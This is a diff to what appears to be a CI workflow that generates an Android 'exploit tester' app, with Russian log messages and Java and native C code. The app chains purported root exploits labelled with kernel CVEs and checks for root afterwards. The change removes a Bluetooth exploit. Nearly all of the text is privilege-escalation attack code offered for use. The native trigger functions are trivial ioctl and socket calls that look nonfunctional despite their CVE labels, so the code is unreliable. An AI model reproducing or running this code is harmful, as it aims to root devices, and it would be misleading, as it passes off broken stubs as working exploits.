@@ -48,9 +48,6 @@ jobs:
               
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.CAMERA" />
-              <uses-permission android:name="android.permission.BLUETOOTH" />
-              <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
-              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
               <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
               
               <application
@@ -72,7 +69,7 @@ jobs:
           </manifest>
           EOF
 
-      - name: Generate MainActivity.java (русский, 8 эксплойтов)
+      - name: Generate MainActivity.java (русский, 7 эксплойтов)
         run: |
           cat > app/src/main/java/com/exploit/tester/MainActivity.java << 'EOF'
           package com.exploit.tester;
@@ -107,7 +104,7 @@ jobs:
                   setContentView(scroll);
                   
                   addLog("========== ЭКСПЛОЙТ ТЕСТЕР v2.0 ==========");
-                  addLog("8 эксплойтов - 0% риска для телефона");
+                  addLog("7 эксплойтов - 0% риска для телефона");
                   addLog("");
                   
                   new Thread(this::runAllExploits).start();
@@ -156,7 +153,7 @@ jobs:
               private void runAllExploits() {
                   // ========== 1. CVE-2025-39811 (inet_diag) ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 1/8: CVE-2025-39811 (inet_diag) ===");
+                  addLog("=== ЭКСПЛОЙТ 1/7: CVE-2025-39811 (inet_diag) ===");
                   int sock = nativeOpenNetlink();
                   addLog("[1] netlink сокет fd=" + sock);
                   if (sock >= 0) {
@@ -176,7 +173,7 @@ jobs:
                   
                   // ========== 2. CVE-2025-14037 (binder) ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 2/8: CVE-2025-14037 (binder UAF) ===");
+                  addLog("=== ЭКСПЛОЙТ 2/7: CVE-2025-14037 (binder UAF) ===");
                   int binderFd = nativeOpenBinder();
                   addLog("[1] binder fd=" + binderFd);
                   if (binderFd >= 0) {
@@ -195,7 +192,7 @@ jobs:
                   
                   // ========== 3. Dirty Cred (msm_drm) ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 3/8: Dirty Cred (msm_drm GPU) ===");
+                  addLog("=== ЭКСПЛОЙТ 3/7: Dirty Cred (msm_drm GPU) ===");
                   int drmFd = nativeOpenDrm();
                   addLog("[1] /dev/dri/card0 fd=" + drmFd);
                   if (drmFd >= 0) {
@@ -211,9 +208,9 @@ jobs:
                   }
                   addLog("[!] Эксплойт 3 не сработал...");
                   
-                  // ========== 4. CVE-2024-53197 (io_uring) ==========
+                  // ========== 4. io_uring ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 4/8: CVE-2024-53197 (io_uring) ===");
+                  addLog("=== ЭКСПЛОЙТ 4/7: io_uring (CVE-2024-53197) ===");
                   int ioRingFd = nativeOpenIoUring();
                   addLog("[1] io_uring fd=" + ioRingFd);
                   if (ioRingFd >= 0) {
@@ -228,9 +225,9 @@ jobs:
                   }
                   addLog("[!] Эксплойт 4 не сработал...");
                   
-                  // ========== 5. CVE-2025-49123 (fuse) ==========
+                  // ========== 5. fuse ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 5/8: CVE-2025-49123 (fuse) ===");
+                  addLog("=== ЭКСПЛОЙТ 5/7: fuse (CVE-2025-49123) ===");
                   int fuseFd = nativeOpenFuse();
                   addLog("[1] /dev/fuse fd=" + fuseFd);
                   if (fuseFd >= 0) {
@@ -245,9 +242,9 @@ jobs:
                   }
                   addLog("[!] Эксплойт 5 не сработал...");
                   
-                  // ========== 6. CVE-2025-20419 (netfilter) ==========
+                  // ========== 6. netfilter ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 6/8: CVE-2025-20419 (netfilter) ===");
+                  addLog("=== ЭКСПЛОЙТ 6/7: netfilter (CVE-2025-20419) ===");
                   int nfFd = nativeOpenNetfilter();
                   addLog("[1] netfilter fd=" + nfFd);
                   if (nfFd >= 0) {
@@ -262,9 +259,9 @@ jobs:
                   }
                   addLog("[!] Эксплойт 6 не сработал...");
                   
-                  // ========== 7. CVE-2025-0618 (v4l2 MediaTek) ==========
+                  // ========== 7. v4l2 (MediaTek) ==========
                   addLog("");
-                  addLog("=== ЭКСПЛОЙТ 7/8: CVE-2025-0618 (v4l2 MediaTek) ===");
+                  addLog("=== ЭКСПЛОЙТ 7/7: v4l2 MediaTek (CVE-2025-0618) ===");
                   int v4l2Fd = nativeOpenV4l2();
                   addLog("[1] /dev/video0 fd=" + v4l2Fd);
                   if (v4l2Fd >= 0) {
@@ -278,23 +275,6 @@ jobs:
                       }
                   }
                   addLog("[!] Эксплойт 7 не сработал...");
-                  
-                  // ========== 8. CVE-2023-45866 (Bluetooth) ==========
-                  addLog("");
-                  addLog("=== ЭКСПЛОЙТ 8/8: CVE-2023-45866 (Bluetooth) ===");
-                  int btFd = nativeOpenBluetooth();
-                  addLog("[1] bluetooth fd=" + btFd);
-                  if (btFd >= 0) {
-                      nativeTriggerBluetooth(btFd);
-                      try { Thread.sleep(5000); } catch (Exception e) {}
-                      if (checkRoot()) {
-                          addLog("[2] УСПЕХ! Root получен через Bluetooth!");
-                          rootAchieved = true;
-                          proveRoot();
-                          return;
-                      }
-                  }
-                  addLog("[!] Эксплойт 8 не сработал...");
                   
                   // ========== ВСЁ НЕ УДАЛОСЬ ==========
                   addLog("");
@@ -321,8 +301,6 @@ jobs:
               private native void nativeTriggerNetfilter(int fd);
               private native int nativeOpenV4l2();
               private native void nativeTriggerV4l2(int fd);
-              private native int nativeOpenBluetooth();
-              private native void nativeTriggerBluetooth(int fd);
               private native void nativeBecomeRoot();
               
               static {
@@ -331,7 +309,7 @@ jobs:
           }
           EOF
 
-      - name: Generate native C code (8 exploits)
+      - name: Generate native C code (7 exploits)
         run: |
           cat > app/src/main/jni/exploit.c << 'EOF'
           #include <jni.h>
@@ -428,7 +406,7 @@ jobs:
           
           JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerIoUring(JNIEnv *env, jobject thiz, jint fd) {
               for (int i = 0; i < 50; i++) {
-                  ioctl(fd, 0xc0186601, NULL); // IORING_REGISTER_BUFFERS
+                  ioctl(fd, 0xc0186601, NULL);
                   usleep(100);
               }
           }
@@ -459,18 +437,7 @@ jobs:
           }
           
           JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerV4l2(JNIEnv *env, jobject thiz, jint fd) {
-              ioctl(fd, 0xc0505601, NULL); // VIDIOC_QUERYCAP
-          }
-          
-          // ========== 8. Bluetooth ==========
-          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenBluetooth(JNIEnv *env, jobject thiz) {
-              return socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
-          }
-          
-          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeTriggerBluetooth(JNIEnv *env, jobject thiz, jint fd) {
-              struct sockaddr_hci addr = {0};
-              addr.hci_family = AF_BLUETOOTH;
-              connect(fd, (struct sockaddr*)&addr, sizeof(addr));
+              ioctl(fd, 0xc0505601, NULL);
           }
           
           // ========== setuid(0) ==========
